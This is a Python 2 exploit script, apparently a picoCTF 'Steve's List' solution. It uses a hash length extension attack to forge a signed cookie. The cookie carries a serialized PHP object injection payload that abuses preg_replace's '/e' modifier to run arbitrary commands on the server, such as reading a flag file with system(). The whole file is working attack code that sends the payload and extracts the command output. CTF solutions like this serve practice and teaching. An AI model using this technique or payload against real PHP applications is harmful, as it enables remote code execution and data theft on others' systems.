 #!/usr/bin/python
 # -*- coding: utf-8 -*-

import urllib
import urllib2
import hashpumpy

def send(command):
    """
    Send a command to the Steve's List server.
    Example: send("system('cat /home/daedalus/flag.txt')")
    """
    # calculate hash
    sig = "2141b332222df459fd212440824a35e63d37ef69"
    data = "b:1;"
    kl = 8
    add = "\n" + "O:4:\"Post\":3:{s:8:\"\00*\x00title\";s:5:\"title\";s:7:\"\00*\x00text\";s:1:\"a\";s:10:\"\00*\x00filters\";a:1:{i:0;O:6:\"Filter\":2:{s:10:\"\00*\x00pattern\";s:4:\"/a/e\";s:7:\"\00*\x00repl\";s:"+str(len(command))+":\""+command+"\";}}}"
    h = hashpumpy.hashpump(sig, data, add, kl)
    
    # set up cookie
    hashed = str(h[0])
    url_command = urllib.quote_plus(h[1])
    cookie = 'custom_settings='+url_command+';'+'custom_settings_hash='+hashed

    # send request
    HOST = "http://steveslist.picoctf.com/"
    opener = urllib2.build_opener()
    opener.addheaders.append(('Cookie', cookie))

    # handle output
    f = opener.open(HOST)
    output = f.read()
    index1 = output.index("</html>")+8
    index2 = output.index("<!-- POST")-1
    f.close()
    return output[index1:index2]